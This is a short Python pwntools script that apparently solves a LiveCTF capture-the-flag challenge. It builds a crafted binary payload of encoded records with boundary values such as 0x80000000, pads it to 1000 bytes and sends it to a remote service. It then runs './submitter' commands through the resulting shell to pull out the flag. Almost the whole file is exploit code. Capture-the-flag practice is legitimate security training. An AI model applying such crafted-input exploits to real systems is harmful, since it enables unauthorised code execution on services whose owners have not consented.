#!/usr/bin/env python3

from pwn import *
context.log_level = 'debug'

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

r = remote(HOST, int(PORT))
BUF = b"TEST"

BUF += p16(1)

BUF += b"A"*4

c = 0

DATA = []
DATA.append(16)
DATA += list(b'UUUUUUU')
DATA += list(p16(0))
print(len(DATA))
for i in range(10):
    DATA[i] += c
c+=1
BUF += bytes(DATA)

DATA = []
DATA.append(4)
DATA += list(b'fUzZ\x00tHiS')
for i in range(10):
    DATA[i] += c
c+=1
BUF += bytes(DATA)

DATA = []
DATA.append(64)
DATA += list(p16(0))
DATA += list(b'1133713')
for i in range(10):
    DATA[i] += c
c+=1
BUF += bytes(DATA)

DATA = []
DATA.append(0x80)
DATA += list(p32(0x80000000))
DATA += list(p32(0x80000000))
DATA.append(0)
for i in range(10):
    DATA[i] += c
c+=1
BUF += bytes(DATA)

SEND = BUF + b"A" *(1000 - len(BUF))

r.sendlineafter(b"trickshot...", SEND)
r.sendline(b"./submitter")
r.sendline(b"./submitter")
r.sendline(b"./submitter")
log.info(r.recv(1024))
# r.interactive()

F = r.recvuntil(b"LiveCTF{").decode().strip()
T = r.recvuntil(b"}").decode().strip()
log.info(f"F: {F+T}")
r.close()

# r.interactive()
